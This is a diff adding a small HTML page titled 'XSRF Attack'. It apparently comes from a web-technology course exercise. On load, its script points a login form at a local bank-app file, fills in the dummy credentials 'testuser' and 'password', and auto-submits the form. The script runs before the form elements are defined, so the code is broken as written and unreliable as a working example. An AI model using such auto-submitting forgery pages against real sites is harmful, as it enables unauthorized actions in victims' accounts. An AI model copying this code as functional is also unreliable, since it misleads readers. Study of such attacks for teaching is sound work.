@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+ <html> 
+ <head>
+ <title>XSRF Attack</title>
+ </head> 
+ <body> 
+ <script> 
+ document.getElementById("loginForm").action = "file:///C:/Users/coe8/Documents/Web%20Technology/BankApp4.html"; 
+ document.getElementById("username").value = "testuser"; 
+ document.getElementById("password").value = "password"; 
+ document.getElementById("loginForm").submit(); 
+ </script> 
+ <form id="loginForm"> 
+ <input type="text" id="username" name="username"> 
+ <input type="password" id="password" name="password"> 
+ <input type="submit" value="Submit"> 
+ </form>
+ </body> 
+ </html>
